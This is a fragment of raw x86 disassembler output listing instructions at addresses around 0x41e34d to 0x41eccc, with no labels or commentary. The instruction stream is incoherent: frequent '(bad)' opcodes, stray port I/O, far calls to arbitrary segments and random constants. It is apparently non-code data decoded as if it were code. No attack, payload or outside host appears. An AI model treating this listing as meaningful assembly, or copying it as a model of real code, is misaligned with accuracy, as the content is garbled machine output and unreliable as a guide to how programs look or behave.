  41e34d:	fild   QWORD PTR [ebp+0x6144d0ca]
  41e353:	fstp   DWORD PTR ds:0x5a5489f2
  41e359:	(bad)  
  41e35a:	pop    ss
  41e35b:	or     BYTE PTR [edi-0x5f663ad3],dh
  41e361:	sbb    dh,dl
  41e363:	adc    dh,BYTE PTR [edx+edi*1]
  41e366:	int    0xf
  41e368:	mov    ecx,0x7f5eb916
  41e36d:	ret    0xe033
  41e370:	add    al,0x58
  41e372:	xor    bl,BYTE PTR [ecx+0x510fd117]
  41e378:	sub    DWORD PTR [ecx],eax
  41e37a:	add    ah,ch
  41e37c:	jl     0x41e394
  41e37e:	je     0x41e375
  41e380:	scas   al,BYTE PTR es:[edi]
  41e381:	leave  
  41e382:	rcr    BYTE PTR [ebp+0x18],0x67
  41e386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e387:	imul   DWORD PTR [esi-0x29fd4365]
  41e38d:	cmc    
  41e38e:	loop   0x41e359
  41e390:	sbb    esi,DWORD PTR gs:[ecx]
  41e393:	inc    edx
  41e394:	rcl    al,cl
  41e396:	loope  0x41e3eb
  41e398:	out    0x6e,al
  41e39a:	mov    eax,DWORD PTR [eax+0x768ed2fe]
  41e3a0:	cmc    
  41e3a1:	aad    0x78
  41e3a3:	scas   al,BYTE PTR es:[edi]
  41e3a4:	bound  ecx,QWORD PTR [edx+0x5fbddbc0]
  41e3aa:	ret    0x725b
  41e3ad:	pop    ss
  41e3ae:	int    0x90
  41e3b0:	mov    ebp,0x94f17957
  41e3b5:	sbb    bl,ah
  41e3b7:	push   ds
  41e3b8:	in     al,0xfb
  41e3ba:	out    dx,eax
  41e3bb:	shl    BYTE PTR [ecx-0xbe23e87],0x3a
  41e3c2:	jmp    0x53b0c073
  41e3c7:	test   DWORD PTR [edi],0x2a134995
  41e3cd:	sub    DWORD PTR [esi-0x21],esp
  41e3d0:	ret    
  41e3d1:	sbb    BYTE PTR [ebx+0x19],bl
  41e3d4:	std    
  41e3d5:	mov    al,ds:0x4a0fa8b4
  41e3da:	rol    BYTE PTR [esi+0x62],1
  41e3dd:	cmp    DWORD PTR [ebp+0x38],0xed919e06
  41e3e4:	lods   al,BYTE PTR ds:[esi]
  41e3e5:	xor    eax,0xe043d2f6
  41e3ea:	aad    0x27
  41e3ec:	mov    bl,0x14
	...
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xac341009
  41e465:	and    al,0x67
  41e467:	inc    ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	fidiv  DWORD PTR [eax]
  41e470:	ret    0x4db2
  41e473:	add    edx,ebx
  41e475:	xchg   DWORD PTR [eax+0x7f],edi
  41e478:	xchg   BYTE PTR [ecx-0x6e],al
  41e47b:	jbe    0x41e4b9
  41e47d:	dec    ebx
  41e47e:	popa   
  41e47f:	add    BYTE PTR [eax+ebp*4-0x73c9fece],ah
  41e486:	or     ecx,esp
  41e488:	cdq    
  41e489:	ret    0xa6bc
  41e48c:	pop    ss
  41e48d:	inc    esp
  41e48e:	jp     0x41e430
  41e490:	and    al,0xbc
  41e492:	hlt    
  41e493:	push   cs
  41e494:	push   ebx
  41e495:	call   0x517e0570
  41e49a:	cli    
  41e49b:	mov    esp,0x24e7a63f
  41e4a0:	and    DWORD PTR ds:[edx+eax*8+0x2c],ebp
  41e4a5:	or     ebp,ecx
  41e4a7:	(bad)  
  41e4a8:	rcl    DWORD PTR [eax-0x78424c1c],1
  41e4ae:	inc    ecx
  41e4af:	jbe    0x41e44a
  41e4b1:	and    al,0xfb
  41e4b3:	je     0x41e489
  41e4b5:	repnz or al,0x59
  41e4b8:	scas   eax,DWORD PTR es:[edi]
  41e4b9:	sub    dh,BYTE PTR [ebp+eiz*2+0x5d]
  41e4bd:	mov    ah,0x41
  41e4bf:	aam    0x44
  41e4c1:	and    cl,BYTE PTR [edx]
  41e4c3:	aam    0xa7
  41e4c5:	adc    edi,edx
  41e4c7:	fadd   st,st(2)
  41e4c9:	push   eax
  41e4ca:	sub    ecx,esi
  41e4cc:	(bad)  
  41e4cd:	adc    eax,0x962f0710
  41e4d2:	cmp    ecx,DWORD PTR [edi+0x2c]
  41e4d5:	push   0xffffff87
  41e4d7:	nop
  41e4d8:	xor    al,0x4
  41e4da:	in     eax,dx
  41e4db:	int    0x1a
  41e4dd:	jo     0x41e4d5
  41e4df:	hlt    
  41e4e0:	sar    BYTE PTR [ecx+0x7e066fab],cl
  41e4e6:	mov    ebp,0x748248e0
  41e4eb:	xor    BYTE PTR [ebx],cl
  41e4ed:	cmp    bl,0x5d
  41e4f0:	push   ecx
  41e4f1:	xlat   BYTE PTR ds:[ebx]
  41e4f2:	cmp    eax,0x637ca6f9
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   0x7f
  41e4fa:	push   esp
  41e4fb:	adc    ch,cl
  41e4fd:	dec    ecx
  41e4fe:	jno    0x41e517
  41e500:	pushf  
  41e501:	nop
  41e502:	rcl    DWORD PTR [edx],0xb2
  41e505:	(bad)  
  41e506:	jl     0x41e501
  41e508:	outs   dx,BYTE PTR ds:[esi]
  41e509:	cdq    
  41e50a:	adc    esp,DWORD PTR [esi+0x75]
  41e50d:	push   edi
  41e50e:	rol    BYTE PTR [ecx],0x68
  41e511:	inc    esp
  41e512:	loop   0x41e55b
  41e514:	cli    
  41e515:	jne    0x41e4a7
  41e517:	mov    cl,0x31
  41e519:	retf   
  41e51a:	inc    edi
  41e51b:	ja     0x41e4ea
  41e51d:	xor    dl,BYTE PTR [edx]
  41e51f:	std    
  41e520:	jmp    0x41e4c3
  41e522:	fnsave [esi]
  41e524:	repz fidivr DWORD PTR [ebx+0x55]
  41e528:	daa    
  41e529:	iret   
  41e52a:	push   esp
  41e52b:	enter  0xe16f,0xd1
  41e52f:	aaa    
  41e530:	stos   BYTE PTR es:[edi],al
  41e531:	xchg   edx,edi
  41e533:	mov    esp,0x4a1307b2
  41e538:	mov    ds:0x91ffb13b,al
  41e53d:	and    al,0x88
  41e53f:	call   0x989f128d
  41e544:	es int 0x2f
  41e547:	mov    ebp,0x7c789846
  41e54c:	mov    ch,0xed
  41e54e:	pop    eax
  41e54f:	repnz ins DWORD PTR es:[edi],dx
  41e551:	(bad)  
  41e552:	pop    esi
  41e553:	dec    ebp
  41e554:	pop    ds
  41e555:	test   eax,0xf6fa4ca1
  41e55a:	stc    
  41e55b:	mov    eax,0x9a337ac6
  41e560:	mov    ebx,0x60446517
  41e565:	mov    esp,0x1645fd1d
  41e56a:	sub    BYTE PTR [ebx+0x56],bl
  41e56d:	repnz add BYTE PTR [eax],al
	...
  41e5d4:	add    BYTE PTR [eax],al
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e583
  41e5e3:	xor    ebp,DWORD PTR [ecx+0x1466722]
  41e5e9:	add    BYTE PTR [eax],al
  41e5eb:	add    DWORD PTR [eax],eax
  41e5ed:	add    BYTE PTR [ebp-0x2b],ah
  41e5f0:	cmp    BYTE PTR [edi],al
  41e5f2:	adc    eax,0xcbf67b9e
  41e5f7:	lds    ecx,FWORD PTR [esp+eax*2]
  41e5fa:	cmp    bl,BYTE PTR [ebp-0x27615c11]
  41e600:	cmp    BYTE PTR [edx+0x751fcd25],0x99
  41e607:	sub    bl,BYTE PTR [edi+0x10]
  41e60a:	clc    
  41e60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e60c:	adc    BYTE PTR [ebx],ch
  41e60e:	jp     0x41e669
  41e610:	not    ah
  41e612:	cld    
  41e613:	pop    ebp
  41e614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e615:	inc    ecx
  41e616:	out    0xa4,al
  41e618:	mov    edi,0xc0fc00f6
  41e61d:	dec    ebp
  41e61e:	xchg   esi,eax
  41e61f:	in     al,dx
  41e620:	xlat   BYTE PTR ds:[ebx]
  41e621:	sti    
  41e622:	push   esi
  41e623:	add    BYTE PTR [ebx],bh
  41e625:	inc    ebx
  41e626:	sbb    eax,0x179c3848
  41e62c:	adc    al,BYTE PTR [esi+0x56e7aba4]
  41e632:	ficom  WORD PTR [esi+0x26b68bd1]
  41e638:	adc    eax,0x727042e5
  41e63d:	imul   BYTE PTR [esi-0x7]
  41e640:	(bad)  [ebx]
  41e642:	out    0xa,eax
  41e644:	ret    0x41bf
  41e647:	xchg   edi,eax
  41e648:	outs   dx,BYTE PTR ds:[esi]
  41e649:	and    bh,BYTE PTR [ebx+edi*2+0x2d]
  41e64d:	(bad)  [edi-0x13]
  41e650:	(bad)  
  41e651:	mov    ds:0x31977c80,al
  41e656:	adc    ecx,ebp
  41e658:	ja     0x41e5ef
  41e65a:	jg     0x41e63f
  41e65c:	ret    0x9f11
  41e65f:	scas   al,BYTE PTR es:[edi]
  41e660:	sub    BYTE PTR [ebx-0x81fccc3],0x86
  41e667:	xor    BYTE PTR [esi-0x53b0d886],dl
  41e66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e66e:	aad    0xde
  41e670:	xor    al,0xdf
  41e672:	mov    cl,0xf5
  41e674:	or     esp,DWORD PTR [ebx+0x6e]
  41e677:	inc    ebp
  41e678:	add    al,0xd2
  41e67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e67b:	outs   dx,BYTE PTR ds:[esi]
  41e67c:	add    eax,ebx
  41e67e:	mov    ds:0x7ffece79,al
  41e683:	sub    cl,BYTE PTR [ecx-0x5e6746d5]
  41e689:	xor    eax,esi
  41e68b:	lods   al,BYTE PTR ds:[esi]
  41e68c:	push   edi
  41e68d:	dec    eax
  41e68e:	out    dx,eax
  41e68f:	xor    edi,eax
  41e691:	loope  0x41e615
  41e693:	add    eax,0x62c64a8a
  41e698:	adc    ebp,edx
  41e69a:	into   
  41e69b:	ficomp WORD PTR [edx-0x55]
  41e69e:	(bad)  
  41e6a0:	pop    edx
  41e6a1:	xor    eax,0xd495ff33
  41e6a6:	popa   
  41e6a7:	or     eax,eax
  41e6a9:	mov    BYTE PTR [edx],0xed
  41e6ac:	inc    esi
  41e6ad:	es neg edx
  41e6b0:	pop    ebp
  41e6b1:	mov    ds:0xcbb5fa81,eax
  41e6b6:	push   esp
  41e6b7:	jno    0x41e6b7
  41e6b9:	sub    DWORD PTR [ebp+0x15],ecx
  41e6bc:	jae    0x41e717
  41e6be:	loope  0x41e71b
  41e6c0:	adc    dh,BYTE PTR [eax+0x40be19d9]
  41e6c6:	cmp    esi,DWORD PTR [edi]
  41e6c8:	sbb    al,0xae
  41e6ca:	dec    ebp
  41e6cb:	les    esi,FWORD PTR [esi+esi*4+0x214658e4]
  41e6d2:	lods   eax,DWORD PTR ds:[esi]
  41e6d3:	sahf   
  41e6d4:	lea    esp,[ecx+eiz*1-0x46]
  41e6d8:	add    BYTE PTR [ecx-0x9],0xa3
  41e6dc:	arpl   WORD PTR [edx+0x2cef54f3],bx
  41e6e2:	ss and al,0x8
  41e6e5:	mov    edx,0xe39b468e
  41e6ea:	xor    dl,BYTE PTR [ecx+0x9ff8]
	...
  41e754:	add    BYTE PTR [eax],al
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    esp,ebx
  41e763:	test   eax,0x476719df
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	scas   eax,DWORD PTR es:[edi]
  41e76f:	cmp    BYTE PTR es:[eax-0x59],0xc8
  41e774:	mov    WORD PTR [esi],?
  41e776:	test   dh,0x64
  41e779:	leave  
  41e77a:	and    ecx,DWORD PTR [edi]
  41e77c:	inc    ecx
  41e77d:	add    DWORD PTR [ebp-0x28],0xffffffde
  41e781:	dec    edi
  41e782:	pop    es
  41e783:	mov    ch,0xb8
  41e785:	dec    edx
  41e786:	jge    0x41e799
  41e788:	adc    eax,DWORD PTR [ebx+0x18e9c60]
  41e78e:	push   ss
  41e78f:	xor    dh,BYTE PTR [esp+ecx*2+0x43]
  41e793:	jp     0x41e7b6
  41e795:	rcr    BYTE PTR [esi+0x76],0x96
  41e799:	fst    st(4)
  41e79b:	jno    0x41e7ed
  41e79d:	push   ecx
  41e79e:	andps  xmm3,XMMWORD PTR [ebx-0x27af02a0]
  41e7a5:	and    DWORD PTR [edi],esp
  41e7a7:	lods   al,BYTE PTR ds:[esi]
  41e7a8:	jo     0x41e810
  41e7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ab:	rcr    ecx,0xe3
  41e7ae:	inc    ecx
  41e7af:	loope  0x41e804
  41e7b1:	sbb    dl,dh
  41e7b3:	jle    0x41e773
  41e7b5:	cwde   
  41e7b6:	pop    edi
  41e7b7:	jns    0x41e74d
  41e7b9:	not    BYTE PTR ds:0x506ab761
  41e7bf:	mov    bh,0x1d
  41e7c1:	push   ecx
  41e7c2:	je     0x41e7b4
  41e7c4:	sti    
  41e7c5:	sbb    ebp,DWORD PTR [ebx]
  41e7c7:	das    
  41e7c8:	push   0xa2e748e
  41e7cd:	xchg   edx,eax
  41e7ce:	push   ebp
  41e7cf:	(bad)  
  41e7d0:	das    
  41e7d1:	fistp  DWORD PTR [ecx+0x5]
  41e7d4:	lock pop edi
  41e7d6:	into   
  41e7d7:	mov    bl,bl
  41e7d9:	jge    0x41e7f9
  41e7db:	in     al,dx
  41e7dc:	cdq    
  41e7dd:	inc    edx
  41e7de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7df:	sub    BYTE PTR [edi-0x759aff87],0x9d
  41e7e6:	pop    ss
  41e7e7:	adc    BYTE PTR [esi-0x6a],dh
  41e7ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7eb:	call   0x1abf:0x672fbd5c
  41e7f2:	dec    esi
  41e7f3:	and    al,BYTE PTR [ebx]
  41e7f5:	aas    
  41e7f6:	add    eax,0xdee93bab
  41e7fb:	inc    edx
  41e7fc:	mov    gs,WORD PTR [eax]
  41e7fe:	jb     0x41e83d
  41e800:	stos   BYTE PTR es:[edi],al
  41e801:	pop    esp
  41e802:	sbb    al,0xb5
  41e804:	test   eax,0x3bc81e17
  41e809:	sub    ebx,eax
  41e80b:	fcmovnb st,st(5)
  41e80d:	mov    BYTE PTR [ecx+0x2afd6c87],dh
  41e813:	mov    ch,0x82
  41e815:	xchg   ecx,eax
  41e816:	faddp  st(4),st
  41e818:	cld    
  41e819:	pop    ebx
  41e81a:	add    ah,BYTE PTR ds:[ebp+eax*4+0x3d165d69]
  41e822:	aas    
  41e823:	jle    0x41e881
  41e825:	mov    cl,0xfb
  41e827:	sahf   
  41e828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e829:	or     eax,0xa08a4a89
  41e82e:	shl    DWORD PTR [eax-0x2a],cl
  41e831:	sbb    al,BYTE PTR [esi-0x4a]
  41e834:	add    ecx,DWORD PTR [esi]
  41e836:	cmp    dl,dh
  41e838:	jle    0x41e821
  41e83a:	sbb    esi,edi
  41e83c:	pop    esp
  41e83d:	das    
  41e83e:	adc    al,ah
  41e840:	sbb    al,0x94
  41e842:	cmp    al,0xfc
  41e844:	fiadd  DWORD PTR [ecx]
  41e846:	push   es
  41e847:	mov    cl,0x60
  41e849:	retf   0xd618
  41e84c:	cs scas al,BYTE PTR es:[edi]
  41e84e:	cmp    DWORD PTR [esi+edx*4-0x5],ecx
  41e852:	loope  0x41e827
  41e854:	ins    DWORD PTR es:[edi],dx
  41e855:	pop    esp
  41e856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e857:	add    eax,esp
  41e859:	loope  0x41e836
  41e85b:	jne    0x41e89b
  41e85d:	adc    ah,dl
  41e85f:	(bad)  
  41e860:	dec    edi
  41e861:	mov    WORD PTR ds:0x264906e1,es
  41e867:	sar    BYTE PTR [esi],0x49
  41e86a:	inc    ecx
  41e86b:	add    al,0x61
  41e86d:	sbb    eax,DWORD PTR [eax]
	...
  41e8d3:	add    BYTE PTR [eax],al
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e8a4
  41e8e3:	lahf   
  41e8e4:	push   esi
  41e8e5:	daa    
  41e8e6:	addr16 dec eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	lock test eax,0xa10409ec
  41e8f4:	jb     0x41e8e3
  41e8f6:	push   ebp
  41e8f7:	and    BYTE PTR [ebp-0x163f3414],ch
  41e8fd:	(bad)  
  41e8ff:	pushf  
  41e900:	jne    0x41e923
  41e902:	test   DWORD PTR [ebx+ebx*4],esp
  41e905:	out    dx,eax
  41e906:	jg     0x41e897
  41e908:	arpl   WORD PTR [edx],bx
  41e90a:	or     eax,0xed7a1f50
  41e90f:	popf   
  41e910:	and    cl,BYTE PTR [ebp+0x6]
  41e913:	out    dx,eax
  41e914:	stc    
  41e915:	icebp  
  41e916:	xchg   edi,eax
  41e917:	jnp    0x41e938
  41e919:	mov    ebx,0x2882c85c
  41e91e:	fld    QWORD PTR [edi]
  41e920:	push   DWORD PTR [ebp-0x28]
  41e923:	lods   eax,DWORD PTR ds:[esi]
  41e924:	mov    al,ds:0xe1dfa53
  41e929:	jbe    0x41e997
  41e92b:	(bad)  
  41e92c:	mov    ch,0xcb
  41e92e:	loopne 0x41e8e7
  41e930:	mov    cl,0x4c
  41e932:	jmp    0x41e946
  41e934:	cmp    al,0x97
  41e936:	and    esp,DWORD PTR [ecx+0x16]
  41e939:	icebp  
  41e93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e93b:	sahf   
  41e93c:	pop    ebp
  41e93d:	leave  
  41e93e:	test   BYTE PTR ds:0x4da211b8,ch
  41e944:	mov    ebx,0x8b9ae56d
  41e949:	ret    0x8207
  41e94c:	(bad)
  41e950:	into   
  41e951:	imul   ebx,DWORD PTR [eax+0x3],0xf000bffc
  41e958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e959:	mov    BYTE PTR [eax],bl
  41e95b:	std    
  41e95c:	adc    edi,DWORD PTR [ecx+0x11]
  41e95f:	push   ebx
  41e960:	(bad)  
  41e962:	or     ebx,esi
  41e964:	xchg   ebx,eax
  41e965:	sub    eax,0x1b9d1d8f
  41e96a:	ret    
  41e96b:	jne    0x41e92a
  41e96d:	mov    ds:0x118bf499,al
  41e972:	arpl   WORD PTR [eax+0x4b],dx
  41e975:	fistp  QWORD PTR ds:0x508b8fc1
  41e97b:	or     bl,BYTE PTR [ebx+0x747f3706]
  41e981:	mov    ebx,0x34702a9d
  41e986:	int    0x55
  41e988:	bound  ecx,QWORD PTR [edi]
  41e98a:	inc    ebx
  41e98b:	dec    ebp
  41e98c:	mov    bh,0x4e
  41e98e:	xchg   edx,eax
  41e98f:	sahf   
  41e990:	(bad)  
  41e991:	(bad)  [edi-0x64]
  41e994:	adc    ch,BYTE PTR [edx]
  41e996:	imul   ecx,DWORD PTR [esi+0x79],0x55d5baf4
  41e99d:	(bad)  
  41e99e:	cdq    
  41e99f:	mov    ds:0x5d5cfb9d,eax
  41e9a4:	adc    eax,0xdbb4e6de
  41e9a9:	scas   al,BYTE PTR es:[edi]
  41e9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9ab:	inc    ebx
  41e9ac:	sbb    eax,0xbd3d199a
  41e9b1:	pop    ds
  41e9b2:	push   ss
  41e9b3:	mov    ds:0xfc3ce48e,eax
  41e9b8:	test   BYTE PTR [esi],bl
  41e9ba:	adc    al,0xff
  41e9bc:	(bad)  
  41e9bd:	std    
  41e9be:	in     eax,0xf9
  41e9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c1:	ret    0x3a02
  41e9c4:	inc    edi
  41e9c5:	adc    al,0xd5
  41e9c7:	nop
  41e9c8:	sti    
  41e9c9:	je     0x41ea37
  41e9cb:	cdq    
  41e9cc:	mov    WORD PTR [edx-0x60],ss
  41e9cf:	mov    al,ds:0xe2063707
  41e9d4:	mov    esp,DWORD PTR [edi]
  41e9d6:	inc    eax
  41e9d7:	jle    0x41e9aa
  41e9d9:	inc    edi
  41e9da:	push   esp
  41e9db:	out    dx,eax
  41e9dc:	mov    BYTE PTR [edi+0x50],dl
  41e9df:	daa    
  41e9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9e1:	jne    0x41e9b2
  41e9e3:	div    esp
  41e9e5:	es mov eax,ss:0x33429302
  41e9ec:	jne    0x41e980
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	call   0x149:0x67918270
  41ea69:	add    BYTE PTR [eax],al
  41ea6b:	add    DWORD PTR [eax],eax
  41ea6d:	add    BYTE PTR [edi],ah
  41ea6f:	mov    edx,0xfc0bec10
  41ea74:	test   DWORD PTR [ecx],esp
  41ea76:	(bad)  
  41ea77:	out    dx,al
  41ea78:	lds    ebp,FWORD PTR [ebx+0x53766432]
  41ea7e:	or     ah,BYTE PTR cs:[esi]
  41ea81:	ins    DWORD PTR es:[edi],dx
  41ea82:	cmc    
  41ea83:	retf   
  41ea84:	nop
  41ea85:	repnz mov BYTE PTR [esp+ebx*2+0x85a31eb],bl
  41ea8d:	or     BYTE PTR [ebp+esi*8+0x1c686392],al
  41ea94:	push   ss
  41ea95:	cwde   
  41ea96:	sbb    ecx,DWORD PTR [ecx]
  41ea98:	pop    edi
  41ea99:	mov    DWORD PTR [edi-0x57],ebp
  41ea9c:	push   cs
  41ea9d:	nop
  41ea9e:	pop    edi
  41ea9f:	call   0xbd35:0x5796f982
  41eaa6:	xchg   ecx,eax
  41eaa7:	imul   ecx,DWORD PTR [ecx],0xffffffff
  41eaaa:	add    edx,DWORD PTR [ecx+0x10ea9c33]
  41eab0:	xchg   esi,eax
  41eab1:	push   esi
  41eab2:	sbb    eax,0xb55219ec
  41eab7:	add    al,0xac
  41eab9:	and    bl,BYTE PTR [edx]
  41eabb:	retf   0x7531
  41eabe:	(bad)  
  41eabf:	test   eax,0x4c4163da
  41eac4:	imul   esi,DWORD PTR [esi],0xfffffff7
  41eac7:	cmp    esi,esi
  41eac9:	rol    DWORD PTR fs:[eax-0x5449a1e5],1
  41ead0:	mov    ebp,0x20eca14
  41ead5:	cdq    
  41ead6:	repz jbe 0x41ea84
  41ead9:	stos   DWORD PTR es:[edi],eax
  41eada:	out    dx,eax
  41eadb:	pusha  
  41eadc:	xor    dh,BYTE PTR [ebx+0x46]
  41eadf:	push   0xda922ab3
  41eae4:	out    dx,al
  41eae5:	jp     0x41ea70
  41eae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eae8:	fyl2x  
  41eaea:	loope  0x41ea71
  41eaec:	inc    ecx
  41eaed:	xor    eax,0x3639efc4
  41eaf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaf3:	scas   al,BYTE PTR es:[edi]
  41eaf4:	or     eax,0x3a2618d3
  41eaf9:	aad    0x85
  41eafb:	sbb    DWORD PTR ds:0x7b314bf9,0x17
  41eb02:	fwait
  41eb03:	gs cmp bl,al
  41eb06:	fwait
  41eb07:	xor    eax,0x5338422b
  41eb0c:	lods   eax,DWORD PTR ds:[esi]
  41eb0d:	pop    ecx
  41eb0e:	inc    edx
  41eb0f:	(bad)  
  41eb11:	mov    WORD PTR [edx-0x67e5e364],cs
  41eb17:	or     ch,BYTE PTR [ecx]
  41eb19:	inc    bl
  41eb1b:	xlat   BYTE PTR ds:[ebx]
  41eb1c:	dec    ebp
  41eb1d:	push   ebp
  41eb1e:	loope  0x41eb8b
  41eb20:	adc    DWORD PTR [ebx-0x560357fe],ecx
  41eb26:	pushf  
  41eb27:	into   
  41eb28:	and    ecx,DWORD PTR [ecx]
  41eb2a:	out    0xce,eax
  41eb2c:	sub    al,0x53
  41eb2e:	fwait
  41eb2f:	xchg   DWORD PTR [ecx+0x38b3b155],edi
  41eb35:	jne    0x41eb63
  41eb37:	ret    0x7a64
  41eb3a:	retf   0x323e
  41eb3d:	test   BYTE PTR [esp+eiz*8-0x7f],0x45
  41eb42:	mov    bl,0x58
  41eb44:	pusha  
  41eb45:	push   eax
  41eb46:	jae    0x41ead0
  41eb48:	cmp    dl,BYTE PTR [edx]
  41eb4a:	lea    esi,[ebx]
  41eb4c:	or     al,BYTE PTR [edx-0x4ed69e0]
  41eb52:	cmp    BYTE PTR [edx+0x7a64b9c3],dh
  41eb58:	fsub   QWORD PTR [esi-0x2f4bc641]
  41eb5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb5f:	leave  
  41eb60:	mov    ebx,0x900936dc
  41eb65:	or     ebp,DWORD PTR [edi+0x2a]
  41eb68:	inc    esi
  41eb69:	sub    esp,eax
  41eb6b:	pop    eax
  41eb6c:	pop    esi
  41eb6d:	fiadd  WORD PTR [eax]
	...
  41ebd3:	add    BYTE PTR [eax],al
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xa8
  41ebe3:	mov    cl,0xa6
  41ebe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebe6:	addr16 dec edx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	or     al,0x23
  41ebf0:	loop   0x41ebb9
  41ebf2:	add    DWORD PTR [ecx],esi
  41ebf4:	inc    ecx
  41ebf5:	pop    ebx
  41ebf6:	and    al,0x42
  41ebf8:	std    
  41ebf9:	jmp    0x13304506
  41ebfe:	mov    ebx,DWORD PTR [eax+0x73]
  41ec01:	cmp    edx,esp
  41ec03:	mov    ds:0x90ac6afb,al
  41ec08:	mov    dh,0x6
  41ec0a:	data16 mov ch,0xb4
  41ec0d:	mov    al,ds:0xe416724f
  41ec12:	mul    bl
  41ec14:	dec    eax
  41ec15:	ins    DWORD PTR es:[edi],dx
  41ec16:	sahf   
  41ec17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec18:	inc    eax
  41ec19:	jbe    0x41ec6a
  41ec1b:	das    
  41ec1c:	xchg   ebx,eax
  41ec1d:	dec    edi
  41ec1e:	jg     0x41ec56
  41ec20:	pop    edi
  41ec21:	or     dl,BYTE PTR [edx]
  41ec23:	sub    al,dh
  41ec25:	jno    0x41eca4
  41ec27:	dec    ebp
  41ec28:	or     ecx,DWORD PTR [esi]
  41ec2a:	retfw  0xc317
  41ec2e:	add    eax,0x2e3376be
  41ec33:	jecxz  0x41ebee
  41ec35:	fist   WORD PTR [edi-0x6ded40be]
  41ec3b:	push   0x41
  41ec3d:	xor    eax,0x51f9ad4
  41ec42:	ds cs in eax,0x6
  41ec46:	lods   al,BYTE PTR ds:[esi]
  41ec47:	mov    fs,WORD PTR [eax-0x27]
  41ec4a:	pop    ebp
  41ec4b:	enter  0xa334,0x84
  41ec4f:	ja     0x41ec74
  41ec51:	loopne 0x41ecab
  41ec53:	sub    ecx,DWORD PTR [ecx+0x64]
  41ec56:	push   ebp
  41ec57:	imul   ebp,ecx,0xffffffc6
  41ec5a:	jle    0x41ec10
  41ec5c:	sbb    eax,0xa6a514cb
  41ec61:	loop   0x41ecc6
  41ec63:	add    cl,ch
  41ec65:	enter  0x59bf,0xce
  41ec69:	dec    ebp
  41ec6a:	pop    eax
  41ec6b:	mov    edx,0x100a9491
  41ec70:	pusha  
  41ec71:	pop    ebp
  41ec72:	adc    eax,0x5cb69531
  41ec77:	and    DWORD PTR [ebx+0x59b8cbbf],0x96e1d33a
  41ec81:	lods   eax,DWORD PTR ds:[esi]
  41ec82:	fsub   QWORD PTR [eax-0x10]
  41ec85:	and    BYTE PTR [ebx+0x743138bb],0x5b
  41ec8c:	or     ebx,edi
  41ec8e:	ret    
  41ec8f:	jb     0x41ecf0
  41ec91:	xor    al,0xf6
  41ec93:	mov    eax,ds:0x3564382d
  41ec98:	mov    ds:0x8723b924,al
  41ec9d:	xor    eax,0xf1646dc2
  41eca2:	fnstsw WORD PTR [edx+0x45]
  41eca5:	fisttp DWORD PTR [edx-0x38]
  41eca8:	ret    0xa5bd
  41ecab:	scas   eax,DWORD PTR es:[edi]
  41ecac:	mov    ecx,0xdcef92b0
  41ecb1:	xchg   ecx,eax
  41ecb2:	mov    ?,WORD PTR [eax+0x3a]
  41ecb5:	add    al,0xf8
  41ecb7:	xchg   ebx,eax
  41ecb8:	clc    
  41ecb9:	loop   0x41ec76
  41ecbb:	(bad)  
  41ecbc:	mov    ch,0x60
  41ecbe:	jne    0x41ec74
  41ecc0:	ds scas al,BYTE PTR es:[di]
  41ecc3:	mov    esi,0xbc4ba423
  41ecc8:	push   esi
  41ecc9:	mov    bh,0xf0
  41eccb:	iret   
  41eccc:	in     al,0x3
